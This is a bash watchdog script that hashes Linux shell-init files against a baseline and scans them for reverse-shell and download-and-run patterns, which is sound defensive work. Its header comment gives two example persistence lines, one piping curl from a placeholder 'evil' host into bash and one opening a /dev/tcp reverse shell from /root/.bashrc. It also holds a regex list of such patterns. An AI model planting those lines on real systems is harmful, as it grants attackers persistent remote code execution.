#!/usr/bin/env bash
# selfdef shell-init-watchdog — boot + daily delta of the global
# + root shell-init scripts vs a learned baseline, plus a
# suspicious-pattern scan for command injection.
#
# Every interactive login / shell sources these files as the
# invoking user (root for a root login). An attacker who appends
# a line to any of them —
#
#   echo 'curl -s http://evil/p | bash &' >> /etc/profile.d/00-x.sh
#   echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /root/.bashrc
#
# gets code-exec on every login/shell — a top Linux persistence
# technique (T1546.004). ld-preload-watchdog scans these same
# files but ONLY for LD_PRELOAD/LD_LIBRARY_PATH; this catches
# ARBITRARY appended commands + a curated suspicious-pattern set.
#
# Watched (global + root):
#   /etc/profile  /etc/bash.bashrc  /etc/bashrc
#   /etc/profile.d/*.sh  /etc/zsh/zshrc  /etc/zsh/zprofile
#   /root/.bashrc .bash_profile .profile .bash_login .zshrc
#
# Records (each line: kind<TAB>path<TAB>value):
#   file:<path>:<sha12>      — hash of each init file
#   susp:<path>:<pattern>    — a high-risk exec pattern present
#
# Severity:
#   ok    → no delta and no suspicious pattern
#   warn  → a file hash changed / file added or removed
#   alert → a suspicious command-injection pattern is present in
#           any watched file (the persistence signature)

set -u

PROFILE="${SELFDEF_SHELLINIT_PROFILE:-report}"
BASELINE="${SELFDEF_SHELLINIT_BASELINE:-/var/lib/selfdef/shell-init-baseline.tsv}"

# File list (overridable for testing).
if [[ -n "${SELFDEF_SHELLINIT_FILES:-}" ]]; then
    read -r -a FILES <<< "${SELFDEF_SHELLINIT_FILES}"
else
    FILES=(
        /etc/profile /etc/bash.bashrc /etc/bashrc
        /etc/zsh/zshrc /etc/zsh/zprofile /etc/zsh/zshenv
        /root/.bashrc /root/.bash_profile /root/.profile
        /root/.bash_login /root/.zshrc /root/.zprofile
    )
    for f in /etc/profile.d/*.sh /etc/profile.d/*.zsh; do
        [[ -f "$f" ]] && FILES+=("$f")
    done
fi

# Curated command-injection / reverse-shell / obfuscation
# patterns. High-signal: these almost never appear in a benign
# distro shell-init script.
PATTERNS=(
    'curl[^|;&]*\|[[:space:]]*(ba)?sh'      # curl ... | sh
    'wget[^|;&]*\|[[:space:]]*(ba)?sh'      # wget ... | sh
    '/dev/tcp/'                             # bash reverse shell
    '/dev/udp/'
    'nc[[:space:]]+.*-e'                    # netcat -e
    'ncat[[:space:]]+.*-e'
    'bash[[:space:]]+-i'                    # interactive reverse shell
    'base64[[:space:]]+-d'                  # base64 payload decode
    'base64[[:space:]]+--decode'
    'eval[[:space:]]*[`$]'                  # eval $(...) / eval `...`
    'python[0-9]*[[:space:]]+-c'            # python -c one-liner
    'perl[[:space:]]+-e'
    'mkfifo'                                # named-pipe reverse shell
    'setsid'                                # detached persistence
)

current="$(mktemp)"
trap 'rm -f "$current" "${current}.sorted"' EXIT

declare -a suspicious=()

for f in "${FILES[@]}"; do
    [[ -f "$f" ]] || continue
    h=$(sha256sum "$f" 2>/dev/null | awk '{print substr($1,1,12)}')
    printf 'file\t%s\t%s\n' "$f" "$h" >> "$current"
    # Strip full-line comments before pattern scan to cut noise,
    # but keep inline content (an attacker may hide after code).
    scan=$(grep -vE '^[[:space:]]*#' "$f" 2>/dev/null || true)
    for pat in "${PATTERNS[@]}"; do
        if printf '%s\n' "$scan" | grep -qE "$pat"; then
            printf 'susp\t%s\t%s\n' "$f" "$pat" >> "$current"
            suspicious+=("$(basename "$f"):$pat")
        fi
    done
done

{ sort -u > "${current}.sorted"; } < "$current" && mv "${current}.sorted" "$current"
cur_count=$(wc -l < "$current" | tr -d ' ')

if (( ${#suspicious[@]} > 0 )); then
    mapfile -t suspicious < <(printf '%s\n' "${suspicious[@]}" | sort -u)
fi

if [[ ! -f "$BASELINE" ]]; then
    mkdir -p "$(dirname "$BASELINE")"
    cp "$current" "$BASELINE"
    chmod 0600 "$BASELINE"
    susp_str=$(IFS='|'; echo "${suspicious[*]:-}")
    sev="ok"; [[ ${#suspicious[@]} -gt 0 ]] && sev="alert"
    logger -t selfdef-shell-init -- "$(printf '{"tag":"selfdef-shell-init","severity":"%s","event":"baseline_initial","profile":"%s","entries":%d,"suspicious":"%s"}' "$sev" "$PROFILE" "$cur_count" "$susp_str")"
    [[ "$PROFILE" == "enforce" && "$sev" != "ok" ]] && exit 1
    exit 0
fi

added=$(comm -23 "$current" <(sort -u "$BASELINE"))
removed=$(comm -13 "$current" <(sort -u "$BASELINE"))
n_added=$(printf '%s' "$added"   | grep -c . || true)
n_removed=$(printf '%s' "$removed" | grep -c . || true)

severity="ok"; event="shell_init_intact"
if (( ${#suspicious[@]} > 0 )); then
    severity="alert"; event="shell_init_suspicious_pattern"
elif (( n_added > 0 || n_removed > 0 )); then
    severity="warn"; event="shell_init_changed"
fi

added_sample=$(printf '%s' "$added"   | awk -F'\t' '{print $1":"$2":"$3}' | head -8 | tr '\n' '|')
removed_sample=$(printf '%s' "$removed" | awk -F'\t' '{print $1":"$2":"$3}' | head -8 | tr '\n' '|')
susp_str=$(IFS='|'; echo "${suspicious[*]:-}")

json=$(printf '{"tag":"selfdef-shell-init","severity":"%s","event":"%s","profile":"%s","added":%d,"removed":%d,"suspicious":"%s","added_sample":"%s","removed_sample":"%s"}' \
    "$severity" "$event" "$PROFILE" "$n_added" "$n_removed" "$susp_str" "$added_sample" "$removed_sample")
logger -t selfdef-shell-init -- "$json"

[[ -n "$added" ]]   && printf '%s\n' "$added"   | while IFS=$'\t' read -r k p v; do [[ -n "$k" ]] && logger -t selfdef-shell-init-detail -- "ADDED ${k} ${p} ${v}"; done
[[ -n "$removed" ]] && printf '%s\n' "$removed" | while IFS=$'\t' read -r k p v; do [[ -n "$k" ]] && logger -t selfdef-shell-init-detail -- "REMOVED ${k} ${p} ${v}"; done

cp "$current" "$BASELINE" 2>/dev/null || true

if [[ "$PROFILE" == "enforce" && "$severity" != "ok" ]]; then
    exit 1
fi
exit 0
